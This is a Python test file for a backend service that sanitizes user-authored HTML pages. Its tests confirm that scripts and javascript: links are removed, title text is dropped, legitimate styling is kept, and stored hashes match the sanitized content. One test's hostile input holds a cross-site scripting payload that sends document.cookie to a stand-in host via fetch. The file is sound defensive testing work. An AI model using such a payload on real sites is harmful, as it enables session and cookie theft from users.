"""HTML pages are author-controlled and rendered for public viewers in a
sandboxed iframe with allow-scripts. We sanitize on write so a page can't ship
hostile JS. These tests pin that contract at the service boundary."""

from __future__ import annotations

import hashlib
from uuid import uuid4

import pytest
import pytest_asyncio

from backend.services import files_tree_service


@pytest_asyncio.fixture
async def scope(_db_pool):
    user_id = uuid4()
    await _db_pool.execute(
        "INSERT INTO users (id, name, display_name) VALUES ($1, $2, $2)",
        user_id,
        f"u_{user_id.hex[:6]}",
    )
    # The user IS the scope: content is owned by owner_user_id = user_id.
    return user_id, user_id


@pytest.mark.asyncio
async def test_create_page_strips_scripts_keeps_structure(scope, _db_pool):
    scope_id, user_id = scope
    hostile = (
        '<section class="slide" data-slide="1">'
        "<h1>Deck</h1>"
        '<span data-comment-id="c1">noted</span>'
        '<img src="data:image/png;base64,AAAA">'
        '<a href="javascript:steal()">x</a>'
        "<style>.slide{color:red}</style>"
        "<script>fetch('//evil/'+document.cookie)</script>"
        "</section>"
    )
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Deck",
        created_by=user_id,
        content_type="html",
        content_html=hostile,
    )
    stored = await _db_pool.fetchval("SELECT content_html FROM pages WHERE id = $1", page["id"])
    # Hostile bits gone.
    assert "<script" not in stored and "fetch(" not in stored
    assert "javascript:" not in stored
    # Legitimate structure, styling, comment anchor, and inline image survive.
    assert 'data-slide="1"' in stored and 'class="slide"' in stored
    assert "<style>.slide{color:red}</style>" in stored
    assert 'data-comment-id="c1"' in stored
    assert "data:image/png;base64,AAAA" in stored


@pytest.mark.asyncio
async def test_title_text_does_not_leak_into_body(scope, _db_pool):
    """A full HTML document carries a <title>. nh3 drops the (disallowed) tag,
    but without clean_content_tags it would keep the title's text and render it
    as unstyled body text. The author's <style> must still survive."""
    scope_id, user_id = scope
    doc = (
        "<!doctype html><html><head>"
        "<title>Gong Analysis · Acme Corp</title>"
        "<style>h1{font-family:Fraunces}</style>"
        "</head><body><h1>Report</h1></body></html>"
    )
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Doc",
        created_by=user_id,
        content_type="html",
        content_html=doc,
    )
    stored = await _db_pool.fetchval("SELECT content_html FROM pages WHERE id = $1", page["id"])
    # The title text must be gone entirely — not left as a bare body text node.
    assert "Gong Analysis" not in stored
    # Author styling and real content are untouched.
    assert "font-family:Fraunces" in stored
    assert "<h1>Report</h1>" in stored


@pytest.mark.asyncio
async def test_content_hash_matches_sanitized_bytes(scope, _db_pool):
    """The stored content_hash must be computed from the sanitized body, so the
    optimistic-concurrency guard on the next edit doesn't spuriously conflict."""
    scope_id, user_id = scope
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Hashed",
        created_by=user_id,
        content_type="html",
        content_html="<p>ok</p><script>bad()</script>",
    )
    row = await _db_pool.fetchrow(
        "SELECT content_html, content_hash FROM pages WHERE id = $1", page["id"]
    )
    active = files_tree_service._active_content("html", "", row["content_html"])
    assert row["content_hash"] == hashlib.sha256(active.encode()).hexdigest()


@pytest.mark.asyncio
async def test_update_page_sanitizes_html(scope, _db_pool):
    scope_id, user_id = scope
    page = await files_tree_service.create_page(
        owner_user_id=scope_id,
        name="Live",
        created_by=user_id,
        content_type="html",
        content_html="<p>clean</p>",
    )
    await files_tree_service.update_page(
        page_id=page["id"],
        owner_user_id=scope_id,
        updated_by=user_id,
        content_html="<p>updated</p><script>evil()</script>",
    )
    stored = await _db_pool.fetchval("SELECT content_html FROM pages WHERE id = $1", page["id"])
    assert "updated" in stored
    assert "<script" not in stored and "evil()" not in stored
